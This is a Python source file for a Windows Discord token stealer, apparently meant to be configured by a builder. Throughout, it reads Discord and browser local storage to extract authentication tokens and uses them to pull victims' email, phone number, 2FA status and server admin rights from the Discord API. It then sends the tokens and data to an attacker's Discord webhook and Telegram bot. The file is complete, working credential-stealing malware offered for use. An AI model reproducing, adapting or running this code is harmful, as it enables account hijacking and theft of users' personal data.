#FOR BUILDER
try:
    from config import WEBHOOK_URL, WEBHOOK_STYLE, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID, TELEGRAM_STYLE
except:
    #If Paste
    WEBHOOK_URL = 'PASTE WEBHOOK HERE'
    WEBHOOK_STYLE = True
    TELEGRAM_STYLE = False
    TELEGRAM_BOT_TOKEN = 'PASTE BOT TOKEN: https://t.me/botfather'
    TELEGRAM_USER_ID = 'PASTE U CHAT ID: https://t.me/getmyid_bot'

import os
if os.name != "nt": exit()
import json
import re

#for send tokens to telegram
import telegram
#for send tokens to discord
import urllib3
from urllib.request import Request, urlopen
import time

discord_api = "https://canary.discord.com/api/v8"

def GetTokens():#Good func. return {'from' : ['tokens'], 'from' : ['tokens'] ...}
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord' ,
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Brave" : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = []
        for file_name in os.listdir(path + ldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        if len(tokens) > 0:
            grabbed[platform] = tokens
    return grabbed 

def sendMessage_telegramBot (bot_token, user_id, message):
    try:
        request = telegram.utils.request.Request(read_timeout=10)
        bot = telegram.Bot(bot_token, request=request)
        bot.send_message(chat_id=user_id, text=message, parse_mode='html')
    except:
        pass

def token_userData(token):
    while True:
        try:
            http = urllib3.PoolManager()
            response = http.request('GET', discord_api + '/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        except:
            continue
        if response.status == 200:
            break
        elif response.status == 429:
            wait = json.loads(response.data)
            time.sleep(float(wait['retry_after']/1000))
        else:
            return None
    userdata = json.loads(response.data)
    return userdata

def token_guildPerm(token):
    while True:
        try:
            http_get = urllib3.PoolManager()
            guilds_response = http_get.request('GET', discord_api + '/users/@me/guilds', headers={'Authorization': token, 'Content-Type': 'application/json'})
        except:
            continue
        if guilds_response.status == 200:
            break
        elif guilds_response.status == 429:
            wait = json.loads(guilds_response.data)
            time.sleep(float(wait['retry_after']/1000))
        else:
            return None
    guilds = json.loads(guilds_response.data)
    return guilds


def telegramMessage(tokens_grabbed : dict, simple_message = False):
    if simple_message:
        message = ''
        for app in list(tokens_grabbed.keys()):
            message += f'\n<b> Grabbed From {app}</b>\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n'
        return message
    else:#token check, get more token info, etc.
        data = {'members' : {}, 'messages' : []}
        for app in list(tokens_grabbed.keys()):
            for token in tokens_grabbed[app]:
                #get user id info
                userdata = token_userData(token)
                id = userdata['id']
                if not userdata: continue
                if id not in list(data['members'].keys()):
                    data['members'][id] = {}
                    data['members'][id]['tokens'] = [f'{token}']
                    try:
                        if userdata['premium_type'] == 1:
                            nitro = f'Nitro Classic'
                        elif userdata['premium_type'] == 2:
                            nitro = f"Nitro With Games"
                    except:
                        nitro = f"None"
                    info = f'''
User Mention:][{userdata['username']}#{userdata['discriminator']}]
[User ID:][{userdata["id"]}]
[Phone Number:][{f'{userdata["phone"]}' if userdata["phone"] else 'None'}]
[Email Adress:][{f'{userdata["email"]}' if userdata["email"] else 'None'}]
[2FA:][{'True' if userdata["mfa_enabled"] else 'False'}]
[Nitro Status:][{nitro}]'''

                    guilds = token_guildPerm(token)#get guilds info (admin , owner perm.)
                    if not guilds: continue
                    hp = '\n- Permissions:\n\n'
                    owner = '\n- [OWNER]\n'
                    admin = '\n- [ADMINISTRATOR]\n'
                    for guild in guilds:
                        if guild['owner'] == True:
                            if len(info +  hp + owner + f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n' + admin) <= 1600:
                                owner +=  f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n'
                        elif int(guild['permissions']) == 2147483647:
                            if len(info + hp + owner + admin + f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n') <= 1600:
                                admin += f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n'
                    perm = hp + owner + '\n' + admin
                    data['members'][id]['member_info'] = info
                    data['members'][id]['permissons_info'] = perm

                else:
                    data['members'][id]['tokens'].append(token)

        #end generate embed from all info
        if len(list(data['members'].keys())) > 0:
            for member in list(data['members'].keys()):
                tokens = f'\nTokens:\n'+ '\n\n'.join(data['members'][member]['tokens']) + '\n'
                info = data['members'][member]['member_info']
                perm = data['members'][member]['permissons_info']

                result_string = tokens + info + perm

                data['messages'].append(result_string)
        
        return data['messages']

def discordMessage(tokens_grabbed : dict, simple_embed = False):#return embed list for post requests to discord.
    if simple_embed:
        embed = [{'description' : ''}]
        for app in list(tokens_grabbed.keys()):
            embed[0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n```'
        return embed
    else:#token check, get more token info, etc.
        data = {'members' : {},'embed' : []}
        for app in list(tokens_grabbed.keys()):
            for token in tokens_grabbed[app]:
                #get user id info
                userdata = token_userData(token)
                if not userdata: continue
                id = userdata['id']
                if id not in list(data['members'].keys()):
                    data['members'][id] = {}
                    data['members'][id]['tokens'] = [f'{token}']
                    try:
                        if userdata['premium_type'] == 1:
                            nitro = f'Nitro Classic'
                        elif userdata['premium_type'] == 2:
                            nitro = f"Nitro With Games"
                    except:
                        nitro = f"None"
                    info = f'''
```md
[User Mention:][{userdata['username']}#{userdata['discriminator']}]
[User ID:][{userdata["id"]}]
[Phone Number:][{f'{userdata["phone"]}' if userdata["phone"] else 'None'}]
[Email Adress:][{f'{userdata["email"]}' if userdata["email"] else 'None'}]
[2FA:][{'True' if userdata["mfa_enabled"] else 'False'}]
[Nitro Status:][{nitro}]```'''

                    guilds = token_guildPerm(token)#get guilds info (admin , owner perm.)
                    if not guilds: continue
                    hp = '```diff\n- Permissions:\n```\n'
                    owner = '```diff\n- [OWNER]\n'
                    admin = '```diff\n- [ADMINISTRATOR]\n'
                    for guild in guilds:
                        if guild['owner'] == True:
                            if len(info +  hp + owner + f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n```' + admin + '```') <= 1600:
                                owner +=  f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n'
                        elif int(guild['permissions']) == 2147483647:
                            if len(info + hp + owner + '```' + admin + f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n```') <= 1600:
                                admin += f'+ [Name: {guild["name"]}] | [ID: {guild["id"]}]\n'
                    perm = hp + owner + '```\n' + admin + '```'
                    data['members'][id]['member_info'] = info
                    data['members'][id]['permissons_info'] = perm

                else:
                    data['members'][id]['tokens'].append(token)

        #end generate embed from all info
        if len(list(data['members'].keys())) > 0:
            for member in list(data['members'].keys()):
                tokens = f'\n```fix\nTokens:\n'+ '\n\n'.join(data['members'][member]['tokens']) + '\n```'
                info = data['members'][member]['member_info']
                perm = data['members'][member]['permissons_info']

                result_string = tokens + info + perm

                data['embed'].append({'description' : result_string})
        
        return data['embed']

def SendTokens(send_settings : dict, grabbed : dict = None):
    """
    how use
    send_settings = {'discord' : {'webhook', style: True} -> send tokens to only discord
    send_settings = {'telegran' : ['bot-token', 'chat-id', stype_bool]} -> send tokens to only telegram, 1 element - token, 2 - chat-id. send tokens to telegram., 3 stype type.
    send_settings = {'discord' : {'webhook', style: True}, 'telegran' : ['bot-token', 'chat-id', stype_bool]} -> send tokens to telegram and discord
    """
    if not grabbed: grabbed = GetTokens()

    data = {}
    data['discord'] = [{'description' : ''}]
    data['telegram'] = ''

    #send message to discord
    if 'discord' in list(send_settings.keys()):
        if "style" in send_settings['discord']:
            if send_settings['discord']['style']:
                data['discord'] = discordMessage(grabbed, False)#True - simple embed, False - more info(slowed)
            else:
                data['discord'] = discordMessage(grabbed, True)
        else:
            data['discord'] = discordMessage(grabbed, True)
        try:
            urlopen(Request(send_settings['discord']['webhook'], data=json.dumps({"embeds" : data['discord']}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
        except:
            pass
    #send message to telegram
    if 'telegram' in list(send_settings.keys()): # to telegram
        if len(send_settings['telegram']) == 3:
            bot_token = send_settings['telegram'][0]
            user_id = send_settings['telegram'][1]
            style = send_settings['telegram'][2]
            if style:
                for message in telegramMessage(grabbed, False):
                    sendMessage_telegramBot(bot_token, user_id, message)
            else:
                sendMessage_telegramBot(bot_token, user_id, telegramMessage(grabbed, True))

    return data

if __name__ == "__main__":
    SendTokens({'discord' : {'webhook' : WEBHOOK_URL, 'style' : WEBHOOK_STYLE}, 'telegram' : [TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID, TELEGRAM_STYLE]})
